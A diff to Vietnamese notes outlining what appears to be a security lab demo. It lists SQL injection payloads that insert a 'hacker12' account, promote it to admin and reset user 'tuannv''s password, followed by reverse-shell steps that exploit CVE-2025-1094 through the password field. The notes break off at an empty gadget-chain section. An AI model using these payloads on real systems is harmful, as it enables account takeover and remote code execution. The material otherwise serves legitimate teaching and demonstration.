@@ -1,3 +1,23 @@
 - update role account or level < chỉnh sửa thông tin tài khoảng
 - chạy lệnh command
 - connect reverse_shell (lưu ý máy ảo docker dùng linux)
+
+
+1. Demo normal payload:
+    - dùng các account có sẵn trong database
+2. Demo SQLi payload:
+    - nhìn đường dẫn root
+    - tác động database:
+        1. tạo 1 account : ¿'; INSERT INTO users (username, password, role, email) VALUES ('hacker12', 'pwned', 'users', 'hacker12@fcode.org'); --
+        2. đổi role của account = 'admin' : ¿'; UPDATE users SET role = 'admin' WHERE username = 'hacker12'; --
+        3. thay đổi mật khẩu tài khoảng tuannv : ¿'; UPDATE users SET password = '123' WHERE username = 'tuannv'; --
+    - reverse shell:
+        1. bên tấn công chạy listener.js
+        2. chạy parser.js để sinh ra mã độc
+        3. dán mẫ độc vào passwords field và chạy (tận dụng cve-2025-1094)
+        4. coi user : whoami
+        5. tạo folder tungtungtung_sahur : mkdir tungtungtung_sahur
+        6. xuất đường dẫn : pwd
+        7. tạo file test.txt với nội dung "hello dev" : echo "hello dev" > test.txt
+3. Demo gadget_chain:
+    
